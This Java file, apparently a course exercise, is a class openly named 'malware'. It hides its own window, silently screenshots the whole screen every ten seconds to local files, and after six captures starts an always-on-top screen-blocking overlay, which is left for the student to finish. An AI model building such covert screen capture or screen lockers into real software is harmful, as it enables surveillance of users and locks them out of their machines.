package lesson18;

import java.awt.*;
import java.io.*;
import java.awt.event.*;
import java.awt.image.*;
import javax.imageio.*;
import javax.swing.*;

public class malware {

	public static void main(String[] args) {
		new MalwareFrame();
	}

}

class MalwareFrame extends JFrame {
	private Robot robot;
	private Timer timer;
	private int screenCounter = 0;
	private int width, height;
	private Frame blockerWindow;
	public MalwareFrame() {
		try {
			robot = new Robot();
		} catch (AWTException e) {
			// TODO Автоматически созданный блок catch
			e.printStackTrace();
		}
		timer = new Timer(10000, new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent arg0) {
				takeScreenshot();
			}
			
		});
		timer.start();
		
		setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		setVisible(true);
		setVisible(false);
	}
	private void takeScreenshot() {
		screenCounter++;
		Dimension screenDim = Toolkit.getDefaultToolkit().getScreenSize();
		width = screenDim.width;
		height = screenDim.height;
		
		BufferedImage picture = robot.createScreenCapture(
				new Rectangle(0, 0, width, height));
		try {
			ImageIO.write(picture, "PNG",
					new File("/home/user/screenshot"+
							screenCounter+".png"));
		} catch (IOException e) {
			// TODO Автоматически созданный блок catch
			e.printStackTrace();
		}
		
		if (screenCounter == 6) {
			timer.stop();
			blockScreen();
		}
	}
	private void blockScreen() {
		blockerWindow = new Frame();
		blockerWindow.setResizable(false);
		blockerWindow.setBounds(0, 0, width, height);
		blockerWindow.setBackground(Color.CYAN);
		blockerWindow.setAlwaysOnTop(true);
		blockerWindow.setUndecorated(true);
		blockerWindow.setOpacity(0.5f);
		blockerWindow.addWindowListener(new WindowAdapter () {
// Здесь допишите программу			
		});
	}
}
